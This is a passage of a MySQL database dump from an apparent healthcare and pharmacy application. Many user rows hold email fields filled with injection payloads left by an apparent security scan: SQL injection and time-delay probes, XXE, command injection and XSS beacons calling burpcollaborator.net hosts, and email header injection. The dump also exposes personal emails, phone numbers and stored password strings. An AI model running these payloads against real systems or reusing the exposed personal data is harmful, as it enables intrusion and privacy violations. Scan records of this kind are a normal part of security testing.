03:22:06'),(136,'iwyy6{{549*442}}btvb3','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',32,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(137,'securitytesting+QCEngage2@axl.net}}x7slz\'/\"<stp40','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',33,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(138,'securitytesting+QCEngage2@axl.net%}rxsuq\'/\"<km2fr','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',34,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(139,'securitytesting+QCEngage2@axl.netjcxxr%>m8jyq\'/\"<dc6tw','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',35,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(140,'(select extractvalue(xmltype(\'<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % psaci SYSTEM \"http://5hnndphbs0tv84c31sib6q1m1d742s5gx3qrf.burpcollab\'||\'orator.net/\">%psaci;]>\'),\'/l\') from dual)','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',36,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(141,'securitytesting+QCEngage2@axl.net\'||(select extractvalue(xmltype(\'<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % psaci SYSTEM \"http://rql9mbqx1m2hhqlpaerxfca8azgqbef27p0dp.burpcollab\'||\'orator.net/\">%psaci;]>\'),\'/l\') from dual)||\'','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',37,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(142,'securitytesting+QCEngage2@axl.net;declare @q varchar(99);set @q=\'\\\\mpf4l6ps0h1cglkk99qse7939ufla91zprck09.burpcollab\'+\'orator.net\\gxy\'; exec master.dbo.xp_dirtree @q;-- ','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',38,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(143,'securitytesting+QCEngage2@axl.net\';declare @q varchar(99);set @q=\'\\\\9z9rvtzfa4bzq8u7jw0foujqjhp8kwbnzfm8ax.burpcollab\'+\'orator.net\\sfz\'; exec master.dbo.xp_dirtree @q;-- ','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',39,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(144,'securitytesting+QCEngage2@axl.net);declare @q varchar(99);set @q=\'\\\\k3o2z43qeffaujyin74qs5n1nstjo7fz3rqke9.burpcollab\'+\'orator.net\\wmj\'; exec master.dbo.xp_dirtree @q;-- ','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',40,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(145,'securitytesting+QCEngage2@axl.net\');declare @q varchar(99);set @q=\'\\\\xhifdhh3sstn8wcv1ki36i1e157w2ktdh54ysn.burpcollab\'+\'orator.net\\ehc\'; exec master.dbo.xp_dirtree @q;-- ','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',41,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(146,'(select load_file(\'\\\\\\\\f3jxzz3leaf5ueydn24ls0nwnnteo2f43wqpee.burpcollaborator.net\\\\wnx\'))','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',42,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(147,'securitytesting+QCEngage2@axl.net\'+(select load_file(\'\\\\\\\\9cmr8tcfn4oz3877wwdf1uwqwh28xwozcrzkn9.burpcollaborator.net\\\\yyy\'))+\'','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',43,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(148,'securitytesting+QCEngage2@axl.net\'','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',44,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(149,'securitytesting+QCEngage2@axl.net\'(select*from(select(sleep(20)))a)\'','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',45,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(150,'securitytesting+QCEngage2@axl.net\'+(select*from(select(sleep(20)))a)+\'','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',46,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(151,'securitytesting+QCEngage2@axl.net\' and (select*from(select(sleep(20)))a)-- ','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',47,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(152,'securitytesting+QCEngage2@axl.net,(select*from(select(sleep(20)))a)','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',48,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(153,'alex@axl.net','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',49,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(154,'securitytesting+QCEngage2@axl.net\' waitfor delay\'0:0:20\'--','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',50,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(155,'securitytesting+QCEngage2@axl.net\')waitfor delay\'0:0:20\'--','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',51,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(156,'securitytesting+QCEngage2@axl.net\',0)waitfor delay\'0:0:20\'--','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',52,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(157,'securitytesting+QCEngage2@axl.net\'+sleep(20.to_i)+\'','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',53,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(158,'eval(compile(\'for x in range(1):\\n import time\\n time.sleep(20)\',\'a\',\'single\'))','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',54,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(159,'securitytesting+QCEngage2@axl.net\'+eval(compile(\'for x in range(1):\\n import time\\n time.sleep(20)\',\'a\',\'single\'))+\'','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',55,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(160,'securitytesting+QCEngage2@axl.net{${sleep(20)}}','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',56,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(161,'securitytesting+QCEngage2@axl.net\'.sleep(20).\'','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',57,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(162,'securitytesting+QCEngage2@axl.net98203553\' or \'6459\'=\'6459','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',58,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(163,'securitytesting+QCEngage2@axl.net37971320\' or \'7303\'=\'7299','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',59,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(164,'securitytesting+QCEngage2@axl.net42105826\' or 3149=3149-- ','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',60,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(165,'securitytesting+QCEngage2@axl.net45921844\' or 1058=1053-- ','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',61,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(166,'securitytesting+QCEngage2@axl.net\' and \'9569\'=\'9569','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',62,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(167,'securitytesting+QCEngage2@axl.net\' and \'7638\'=\'7636','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',63,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(168,'securitytesting+QCEngage2@axl.net\' and 8069=8069-- ','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',64,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(169,'securitytesting+QCEngage2@axl.net\' and 2579=2574-- ','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',65,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(170,'securitytesting+QCEngage2@axl.net\"','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',66,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(171,'securitytesting+QCEngage2@axl.net|nslookup -q=cname 1gijclg7rwsr70bz0oh75m0i09601oxcpzin7.burpcollaborator.net.&','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',67,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(172,'securitytesting+QCEngage2@axl.net\'\"`0&nslookup -q=cname an1sjungy5z0e9i87xogcv7r7id98x5lx8qwf.burpcollaborator.net.&`\'','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',68,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(173,'securitytesting+QCEngage2@axl.net&nslookup -q=cname xpqflhp30s1ngwkv9kq3ei9e95fwak58xvqjf.burpcollaborator.net.&\'\\\"`0&nslookup -q=cname xpqflhp30s1ngwkv9kq3ei9e95fwak58xvqjf.burpcollaborator.net.&`\'','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',69,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(174,'securitytesting+QCEngage2@axl.net|echo tnfuvh0yzk novg3hxzmh||a #\' |echo tnfuvh0yzk novg3hxzmh||a #|\" |echo tnfuvh0yzk novg3hxzmh||a #','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',70,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(175,'securitytesting+QCEngage2@axl.net&echo azl5k97pwt amyq28lnmr&','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',71,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(176,'securitytesting+QCEngage2@axl.net\"|echo vbch9ahxn1 f4gwpox0xa ||','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',72,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(177,'securitytesting+QCEngage2@axl.net\'|echo c608b32tff gd1m00cfx0 #xzwx','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',73,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(178,'securitytesting+QCEngage2@axl.net|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\\\" |ping -n 21 127.0.0.1','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',74,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(179,'securitytesting+QCEngage2@axl.net|ping -c 21 127.0.0.1||x','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',75,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(180,'securitytesting+QCEngage2@axl.net&ping -n 21 127.0.0.1&','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',76,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(181,'securitytesting+QCEngage2@axl.net\'|ping -c 21 127.0.0.1 #','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',77,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(182,'securitytesting+QCEngage2@axl.net\"|ping -n 21 127.0.0.1 ||','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',78,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(183,'<los xmlns=\"http://a.b/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://a.b/ http://2y1kumy89xasp1t0ipz8nnijiao1jpjdb04ot.burpcollaborator.net/los.xsd\">los</los>','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',79,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(184,'<edc xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://nf65b7ftqird6malzagt48z4zv5m0a1ytlm9b.burpcollaborator.net/foo\"/></edc>','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',80,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(185,'securitytesting+QCEngage2@axl.net]]>><','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',81,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(186,'securitytesting+QCEngage2@axl.net\'+(function(){if(typeof vxpxr===\"undefined\"){var a=new Date();do{var b=new Date();}while(b-a<20000);vxpxr=1;}}())+\'','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',82,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(187,'\"-->\'-->`--><!--#set var=\"xn1n\" value=\"ixz6qlau\"--><!--#set var=\"vnnf\" value=\"lzeao9sb\"--><!--#echo var=\"xn1n\"--><!--#echo var=\"vnnf\"-->','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',83,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(188,'securitytesting+QCEngage2@axl.net\r\nBCC:ki62e4iqtfua9jdi27jq75212s8j37v0js6lua@burpcollaborator.net\r\nofv: h','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',84,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(189,'securitytesting+QCEngage2@axl.net>\r\nBCC:tspbodsz3o4jjsnrcgtzhecac1isdg5at2gv4k@burpcollaborator.net\r\ngsr: f','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',85,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(190,'bapt6vahl6m11a59uybhzwusuj0avyntblyem3@burpcollaborator.net','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',86,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(191,'qvp8ravw6l7gmpqofdwwkbf7fylpgd85wxjq7f','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',87,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(192,'\'\"><svg/onload=(new(Image)).src=\'//6ipoeqict1uw95d42tjc7r2n2e853tvjjb64ut\\56burpcollaborator.net\'>','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',88,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(193,'javascript:/*</script><svg/onload=\'+/\"/+/onmouseover=1/+/[*/[]/+((new(Image)).src=([]+/\\/ceuuaweip7q25b9ayzfi3xytyk4bzzrqfi2bq0\\.burpcollaborator.net/).replace(/\\\\/g,[]))//\'>','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',89,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(194,'appiconweb@gmail.com','N0Ae6UwEs9+VsutmKCcDBw==\r\n','1234567890','Y','Anupam','App Hospital',90,'A','2017-07-18 09:43:08','2017-07-18 09:43:08'),(195,'aaa@mailinator.com','2ERCOOdI/liYVLquUrN1lw==\r\n','00000000','Y','aaa','aaa',91,'A','2017-07-18 10:36:15','2017-07-18 10:36:15'),(196,'aaa2@mailinator.com','2ERCOOdI/liYVLquUrN1lw==\r\n','00000000','Y','aaa','aaa',92,'A','2017-07-18 10:36:15','2017-07-18 10:36:15'),(197,'aaaacsvsdfbdfgs@mailinator.com','2ERCOOdI/liYVLquUrN1lw==\r\n','00000000','Y','aaa','aaa',93,'A','2017-07-18 10:36:15','2017-07-18 10:36:15'),(198,'asdasdasdas@mailinator.com','2ERCOOdI/liYVLquUrN1lw==\r\n','00000000','Y','aaa','aaa',94,'A','2017-07-18 11:53:55','2017-07-18 11:53:55'),(199,'asdasdasdaszxczxc@mailinator.com','2ERCOOdI/liYVLquUrN1lw==\r\n','00000000','Y','aaa','aaa',95,'A','2017-07-18 11:53:55','2017-07-18 11:53:55'),(200,'83fhrcrvhw49v@mailinator.com','2ERCOOdI/liYVLquUrN1lw==\r\n','00000000','Y','aasd','aasd',96,'A','2017-07-18 11:56:41','2017-07-18 11:56:41'),(201,'83fhrcrvhw4339v@mailinator.com','2ERCOOdI/liYVLquUrN1lw==\r\n','00000000','Y','aasd','aasd',97,'A','2017-07-18 11:56:41','2017-07-18 11:56:41'),(202,'ergvwrv4w@mailinator.com','2ERCOOdI/liYVLquUrN1lw==\r\n','00000000','Y','asd','asd',98,'A','2017-07-18 12:09:02','2017-07-18 12:09:02'),(204,'23r2ervwrwve@mailinator.com','2ERCOOdI/liYVLquUrN1lw==\r\n','00000000','Y','asdasdasd','23r2ervwrwve@mailinator.com',100,'A','2017-07-18 12:48:56','2017-07-18 12:48:56'),(205,'susantakumardas@mindtechlabs.com','8AvivOfJbvN95N+mgVSz/mgt04vZOltxYivLrSRQYes=\r\n','1234567890','Y','Susanta','App Hospital Tst',99,'A','2017-07-18 13:20:05','2017-07-18 13:20:05'),(206,'lifemeds@yopmail.com','N0Ae6UwEs9+VsutmKCcDBw==\r\n','00000000','Y','Lifemed','LifeMed Pharma',101,'A','2017-07-19 09:21:10','2017-07-19 09:21:10'),(207,'sdevgan@yopmail.com','PwBx4MKeHmJCZt39lePNfmgt04vZOltxYivLrSRQYes=\r\n','9717156161','Y','Sumit','LifeMed Pharma',101,'U','2017-07-20 21:16:18','2017-07-20 21:16:18'),(208,'lifemed@gmail.com','W5YXq2aFkahS9xMs4HT+qmgt04vZOltxYivLrSRQYes=\r\n','9966600000','Y','mmm','App Hospital',90,'A','2017-07-24 13:02:22','2017-07-24 13:02:22'),(214,'anupam.roy@mindtechlabs.com','ILSDB0aU9cvxjJI2z0ySrGgt04vZOltxYivLrSRQYes=\r\n','9966603576','Y','Anupam Roy','LifeMed Pharmaceutical',19,'A','2017-08-16 11:28:41','2017-08-16 11:28:41'),(215,'webaffiliate3576@gmail.com','Abq1NrvU47zScp44uS6Agmgt04vZOltxYivLrSRQYes=\r\n','9966603576','Y','Anupam Roy','LifeMed Pharmaceutical',19,'A','2017-08-16 11:40:36','2017-08-16 11:40:36'),(216,'sam@yopmail.com','N0Ae6UwEs9+VsutmKCcDBw==\r\n','00000000','Y','Sam','SAM Practice',102,'A','2017-08-18 16:47:27','2017-08-18 16:47:27'),(217,'nursecare@yopmail.com','N0Ae6UwEs9+VsutmKCcDBw==\r\n','00000000','Y','Nurse','Nurses Care',103,'A','2017-08-20 15:13:31','2017-08-20 15:13:31'),(218,'bam@yopmail.com','QiIIfD2Pji45mLRYZHo0QWgt04vZOltxYivLrSRQYes=\r\n','3232342423','Y','Bam','SAM Practice',102,'U','2017-08-20 15:33:51','2017-08-20 15:33:51'),(219,'reddylru@yahoo.com','N0Ae6UwEs9+VsutmKCcDBw==\r\n','00000000','Y','Lourdu Reddy','Colombia Asia',104,'A','2017-08-21 07:14:17','2017-08-21 07:14:17');

/*Table structure for table `qc_organization` */

DROP TABLE IF EXISTS `qc_organization`;

CREATE TABLE `qc_organization` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(500) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=105 DEFAULT CHARSET=latin1;

/*Data for the table `qc_organization` */

insert  into `qc_organization`(`id`,`name`) values (2,'Apollo'),(3,'Yashoda Hospital'),(4,'Yashoda'),(5,'Narasimha'),(6,'Apollo'),(7,'Apollo'),(8,'Apollo'),(9,'Care'),(10,'Nursing Care'),(11,'CorpArete Clinic'),(12,'Apollo'),(13,'LifeMed Pharma'),(14,'LifeMed Pharma'),(15,'LifeMed Pharma'),(16,'LifeMed Pharma'),(17,'LifeMed Pharma'),(18,'LifeMed Pharma'),(19,'LifeMed Pharmaceutical'),(20,'Test'),(21,'Chicago Bullz'),(22,'Tom\\\'s Practice '),(23,'Sunmi\'s Clinic'),(24,'Test'),(25,'Dr. Office'),(26,'Dr. Office'),(27,'Dr. Office'),(28,'Dr. Office'),(29,'Dr. Office'),(30,'Dr. Office'),(31,'Dr. Office'),(32,'Dr. Office'),(33,'Dr. Office'),(34,'Dr. Office'),(35,'Dr. Office'),(36,'Dr. Office'),(37,'Dr. Office'),(38,'Dr. Office'),(39,'Dr. Office'),(40,'Dr. Office'),(41,'Dr. Office'),(42,'Dr. Office'),(43,'Dr. Office'),(44,'Dr. Office'),(45,'Dr. Office'),(46,'Dr. Office'),(47,'Dr. Office'),(48,'Dr. Office'),(49,'Dr. Office'),(50,'Dr. Office'),(51,'Dr. Office'),(52,'Dr. Office'),(53,'Dr. Office'),(54,'Dr. Office'),(55,'Dr. Office'),(56,'Dr. Office'),(57,'Dr. Office'),(58,'Dr. Office'),(59,'Dr. Office'),(60,'Dr. Office'),(61,'Dr. Office'),(62,'Dr. Office'),(63,'Dr. Office'),(64,'Dr. Office'),(65,'Dr. Office'),(66,'Dr. Office'),(67,'Dr. Office'),(68,'Dr. Office'),(69,'Dr. Office'),(70,'Dr. Office'),(71,'Dr. Office'),(72,'Dr. Office'),(73,'Dr. Office'),(74,'Dr. Office'),(75,'Dr. Office'),(76,'Dr. Office'),(77,'Dr. Office'),(78,'Dr. Office'),(79,'Dr. Office'),(80,'Dr. Office'),(81,'Dr. Office'),(82,'Dr. Office'),(83,'Dr. Office'),(84,'Dr. Office'),(85,'Dr. Office'),(86,'Dr. Office'),(87,'Dr. Office'),(88,'Dr. Office'),(89,'Dr. Office'),(90,'App Hospital'),(91,'aaa'),(92,'aaa'),(93,'aaa'),(94,'aaa'),(95,'aaa'),(96,'aasd'),(97,'aasd'),(98,'asd'),(99,'App Hospital Tst'),(100,'23r2ervwrwve@mailinator.com'),(101,'LifeMed Pharma'),(102,'SAM Practice'),(103,'Nurses Care'),(104,'Colombia Asia');

/*Table structure for table `qc_user_roles` */

DROP TABLE IF EXISTS `qc_user_roles`;

CREATE TABLE `qc_user_roles` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `createdat` datetime DEFAULT NULL,
  `role_id` int(11) DEFAULT NULL,
  `user_id` decimal(19,2) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

/*Data for the table `qc_user_roles` */

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
